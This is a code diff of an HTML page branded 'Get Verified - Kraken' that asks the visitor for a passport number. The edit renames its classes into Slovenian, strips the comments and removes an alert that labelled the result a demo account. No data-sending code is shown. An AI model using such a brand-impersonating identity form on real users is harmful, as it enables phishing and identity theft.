@@ -6,64 +6,61 @@
   <title>Get Verified - Kraken</title>
   <link rel="icon" type="image" href="../img/favicon.ico">
   <link rel="stylesheet" href="../css/style.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 </head>
 <body>
 
-  <!-- Global Header -->
-  <header class="global-header">
-    <a href="../index.html" class="logo-slot">
-      <img src="../img/logo-full.svg" class="logo-img">
+  <header class="glavni-header">
+    <a href="../index.html" class="polje-logotip">
+      <img src="../img/logo-full.svg" class="image-logotip">
     </a>
 
-    <div class="header-actions">
-      <label class="lang-pill">
-        <img src="../img/icons/globe.svg" alt="" class="lang-icon" width="16" height="16">
+    <div class="dejanja-header">
+      <label class="jezikovni-button">
+        <img src="../img/icons/globe.svg" alt="" class="icon-jezika" width="16" height="16">
       </label>
-      <a href="login.html" class="btn-header-light">Sign out</a>
+      <a href="login.html" class="button-header-svetel">Sign out</a>
     </div>
   </header>
 
-  <!-- Poll Step 3: Info Page 3 -->
-  <main class="flow-container">
-    <div class="sub-nav">
-      <a href="poll-2.html" class="btn-back">‹ Back</a>
-      <a href="../index.html" class="btn-close" title="Exit">✕</a>
+  <main class="glavni-vsebnik">
+    <div class="pod-nav">
+      <a href="poll-2.html" class="button-nazaj">‹ Back</a>
+      <a href="../index.html" class="button-zapri" title="Exit">✕</a>
     </div>
 
-    <div class="card text-left">
-      <h1 class="card-title-soft">Personal Identification</h1>
-      <p class="card-sub">This information helps us verify your identity. We’re legally required to collect this info. </p>
+    <div class="kartica besedilo-levo">
+      <h1 class="mehki-naslov-kartice">Personal Identification</h1>
+      <p class="podnaslov-kartice">This information helps us verify your identity. We’re legally required to collect this info. </p>
 
-      <!-- Selected Country Summary Box -->
-      <div class="summary-box">
-        <div class="summary-icon"><img src="../img/icons/globe.svg" alt="Country" width="20" height="20"></div>
+      <div class="skatla-povzetek">
+        <div class="icon-povzetek"><img src="../img/icons/globe.svg" alt="Country" width="20" height="20"></div>
         <div>
-          <div class="summary-label">Selected Country</div>
-          <div class="summary-val" id="summary-country-text">🇸🇮 Slovenia</div>
+          <div class="label-povzetek">Selected Country</div>
+          <div class="vrednost-povzetek" id="summary-country-text">🇸🇮 Slovenia</div>
         </div>
       </div>
 
-      <form action="login.html" method="GET" onsubmit="alert('Registration complete! Your demo account is ready.');">
-        <div class="field-group">
-          <input type="text" id="poll-info-field" class="text-field" placeholder=" " required>
-          <label class="floating-label" for="poll-info-field">Passport number</label>
+      <form id="poll-3-form" action="login.html" method="GET">
+        <div class="skupina-polja">
+          <input type="text" id="poll-info-field" class="besedilno-polje" placeholder=" " minlength="5" maxlength="9" required>
+          <label class="lebdeca-label" for="poll-info-field">Passport number</label>
         </div>
 
-        <div class="checkbox-list">
-          <label class="check-item">
+        <div class="seznam-potrditev">
+          <label class="potrditveni-element">
             <input type="checkbox" checked required>
             <span>I confirm all provided information is accurate.</span>
           </label>
         </div>
 
-        <button type="submit" class="btn btn-primary">Complete Registration</button>
+        <button type="submit" class="button glavni-button">Complete Registration</button>
       </form>
     </div>
   </main>
 
-  <!-- Global Footer -->
-  <footer class="global-footer">
-    <div class="footer-links">
+  <footer class="glavni-footer">
+    <div class="povezave-footer">
       <a href="#">Privacy Notice</a>
       <a href="#">Terms of Service</a>
     </div>
